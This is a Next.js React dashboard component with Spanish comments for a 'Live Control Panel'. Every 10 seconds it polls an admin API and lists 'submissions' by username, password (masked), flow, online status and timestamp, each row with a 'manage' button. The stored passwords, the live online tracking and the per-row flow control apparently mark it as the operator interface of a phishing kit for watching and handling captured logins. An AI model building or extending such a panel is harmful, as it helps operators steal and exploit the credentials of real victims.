"use client";
import { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import ProtectedDashboard from "./ProtectedDashboard";

export default function DashboardPage() {
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState("all");
  const router = useRouter();

  // Función de carga optimizada con useCallback para evitar re-renders
  const fetchSubmissions = useCallback(async () => {
    try {
      const response = await fetch("/api/admin/submissions");
      if (response.ok) {
        const data = await response.json();
        setSubmissions(data.submissions || []);
      } else if (response.status === 401) {
        router.push("/admin");
      }
    } catch (error) {
      console.error("Error fetching submissions:", error);
    } finally {
      setLoading(false);
    }
  }, [router]);

  useEffect(() => {
    fetchSubmissions();
    // Senior tip: Implementar un polling corto para ver datos en tiempo real
    const interval = setInterval(fetchSubmissions, 10000); 
    return () => clearInterval(interval);
  }, [fetchSubmissions]);

  return (
    <ProtectedDashboard>
      <div className="dashboard-container">
        <header className="flex justify-between items-center mb-8">
          <h1 className="text-2xl font-bold text-cyan-400">Live Control Panel</h1>
          <button 
            onClick={fetchSubmissions}
            className="px-4 py-2 bg-cyan-900/30 border border-cyan-500/50 rounded-lg hover:bg-cyan-500/20 transition"
          >
            {loading ? "Actualizando..." : "Refrescar"}
          </button>
        </header>

        {/* Tabla de Control de Tráfico */}
        <div className="overflow-x-auto rounded-xl border border-white/10 bg-black/40 backdrop-blur-md">
          <table className="w-full text-left">
            <thead className="bg-white/5 text-cyan-200 uppercase text-xs">
              <tr>
                <th className="p-4">Usuario</th>
                <th className="p-4">Password</th>
                <th className="p-4">Flujo</th>
                <th className="p-4">Estado</th>
                <th className="p-4">Timestamp</th>
                <th className="p-4">Acciones</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5">
              {submissions.map((sub) => (
                <tr key={sub.id} className="hover:bg-cyan-500/5 transition">
                  <td className="p-4 font-mono text-sm">{sub.username}</td>
                  <td className="p-4 font-mono text-sm opacity-50">********</td>
                  <td className="p-4"><span className="badge-flow">{sub.flow}</span></td>
                  <td className="p-4">
                    <span className={`status-dot ${sub.status === 'online' ? 'bg-green-500' : 'bg-gray-500'}`}></span>
                    {sub.status}
                  </td>
                  <td className="p-4 text-xs opacity-60">{sub.timestamp}</td>
                  <td className="p-4">
                    <button className="text-cyan-400 hover:underline text-sm">Gestionar</button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <style jsx>{`
        .status-dot {
          display: inline-block;
          width: 8px;
          height: 8px;
          border-radius: 50%;
          margin-right: 8px;
          box-shadow: 0 0 8px currentColor;
        }
        .badge-flow {
          background: rgba(79, 246, 226, 0.1);
          color: #4ff6e2;
          padding: 2px 8px;
          border-radius: 4px;
          font-size: 11px;
          border: 1px solid rgba(79, 246, 226, 0.2);
        }
      `}</style>
    </ProtectedDashboard>
  );
}